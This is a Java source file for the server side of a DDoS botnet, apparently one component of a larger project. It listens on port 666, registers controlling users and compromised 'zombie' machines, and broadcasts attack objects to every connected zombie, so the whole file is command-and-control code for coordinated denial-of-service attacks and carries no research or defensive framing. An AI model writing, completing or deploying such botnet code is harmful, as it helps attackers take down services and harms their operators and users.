/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ddosserver;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.util.ArrayList;

/**
 *
 * @author karol
 */
public class DdosServer {

    private ServerSocket socket;
    private ArrayList<ObjectOutputStream> zombie;
    private ArrayList<ObjectInputStream> user;
    
    public static void main(String[] args) {
        DdosServer server = new DdosServer();
        server.start();
    }
    
    public DdosServer(){
        user = new ArrayList();
        zombie = new ArrayList();
        try{
            socket = new ServerSocket(666);
        }
        catch(IOException e){
            e.printStackTrace();
            System.exit(0);
        }
    }

    public void start(){
        new ConnectionListener(this);
    }
    
    public ServerSocket getSocket(){
        return socket;
    }
    
    public void addUser(ObjectInputStream u){
        user.add(u);
        
        //Listen for messages from user
        Thread thread = new Thread(new AttackReceiver(u,this));
        thread.start();
    }
    
    public void removeUser(ObjectInputStream u){
        user.remove(u);
    }
    
    public void addZombie(ObjectOutputStream z){
        zombie.add(z);
    }
    
    //Send attack
    public void broadcastAttack(Attack a){
       
        //Broadcast attack to all zombies
       for (ObjectOutputStream z: zombie){
           try{
               z.writeObject(a);
               System.out.println("Successfully sent attack object to a zombie.\n");
           }
           catch(Exception e){
               
               //Zombies dead remove from list
               zombie.remove(z);
               System.out.println("Object didn't send successfully, removing zombie from list");
           }
       }
    }
    
}
